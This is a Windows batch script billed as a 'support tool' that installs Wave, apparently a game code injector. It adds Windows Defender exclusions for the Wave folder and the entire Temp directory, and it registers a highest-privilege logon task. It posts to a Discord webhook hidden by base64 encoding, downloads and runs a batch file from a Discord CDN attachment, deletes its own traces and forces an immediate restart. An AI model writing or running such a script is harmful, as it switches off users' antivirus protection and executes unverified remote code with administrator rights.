

: : This WILL restart your pc so save any important work before running.




@echo off
net session >nul 2>&1 || (
echo You must run this script as Administrator.
pause
exit /b 1
)
powershell -Command "$action = New-ScheduledTaskAction -Execute '%temp%\install_wave.bat'; $trigger = New-ScheduledTaskTrigger -AtLogon; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'InstallWave' -Description 'Runs the bat file that installs wave' -Settings $settings -RunLevel Highest -Force"
powershell -Command "Write-Host 'All in one support tool created by mi_aio' -ForegroundColor Red"
powershell -Command "Start-Process PowerShell -ArgumentList 'Add-MpPreference -ExclusionPath \"%localappdata%\Wave\",\"$env:Temp\"' -Verb RunAs"
if exist "%localappdata%\Wave" (
echo Deleting Wave in %localappdata%...
rmdir /S /Q "%localappdata%\Wave"
) else echo Wave does not exist in %localappdata%.
for %%F in ("%temp%\Injector.exe" "%temp%\Wave.dll") do (
if exist %%F (
echo Deleting %%~nxF in %temp%...
del /F /Q %%F
) else echo %%~nxF does not exist in %temp%.
)
set "WEBHOOK=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTEyODM1NDg4NTUxOTQ0MjQzL1I5dEhOVjMwSG9HaWFzaGJPbnB0aG04eGtSeEdnU2VoOXRxSXJQUkhNN3hTZTJ6RG1WWkRudWFaRHY4MmJCalFmVDVC"
powershell -Command "$webhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%WEBHOOK%')); Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content='Tool has been ran'} | ConvertTo-Json)"
curl -o "%temp%\Visual-C-Runtimes-All-in-One-May-2024.zip" "https://cdn.discordapp.com/attachments/1163409961439735888/1262442104760696894/Visual-C-Runtimes-All-in-One-May-2024.zip?ex=66b59794&is=66b44614&hm=c3728eee9a216e15b6dcafbeb0b709a97872e2c8296c7f64fae30c3f1a9b7f5b&"
mkdir "%temp%\VisualC++"
powershell -Command "Expand-Archive -Path '%temp%\Visual-C-Runtimes-All-in-One-May-2024.zip' -DestinationPath '%temp%\VisualC++'"
del "%temp%\Visual-C-Runtimes-All-in-One-May-2024.zip"
start /wait cmd /c "cd %temp%\VisualC++ && call install_all.bat"
rmdir /S /Q "%temp%\VisualC++"
curl -o %temp%\node-v20.15.0-x64.msi https://nodejs.org/dist/v20.15.0/node-v20.15.0-x64.msi
start /wait %temp%\node-v20.15.0-x64.msi
del %temp%\node-v20.15.0-x64.msi
curl -o %temp%\aspnetcore-runtime-6.0.31-win-x64.exe https://download.visualstudio.microsoft.com/download/pr/29b7b141-bb4d-462b-8b55-6a1e4a610add/c38161439a048506b923b47fd50d21cc/aspnetcore-runtime-6.0.31-win-x64.exe
start /wait %temp%\aspnetcore-runtime-6.0.31-win-x64.exe
del %temp%\aspnetcore-runtime-6.0.31-win-x64.exe
(
echo @echo off
echo powershell -Command Write-Host "Support tool created by mi_aio" -ForegroundColor Red
echo schtasks /delete /tn "InstallWave" /f
echo cd /d %%temp%%
echo curl -o WaveInstaller.exe "https://cdn.getwave.gg/WaveInstaller.exe"
echo start /wait WaveInstaller.exe
echo del WaveInstaller.exe
echo del install_wave.bat
echo del %%~f0
echo exit
) > "%temp%\install_wave.bat"
(
echo @echo off
echo timeout /t 5 /nobreak >nul
echo del "%~f0"
echo del "%temp%\self_delete.bat"
) > "%temp%\self_delete.bat"
start "" /b "%temp%\self_delete.bat"
shutdown /r /t 0
pause
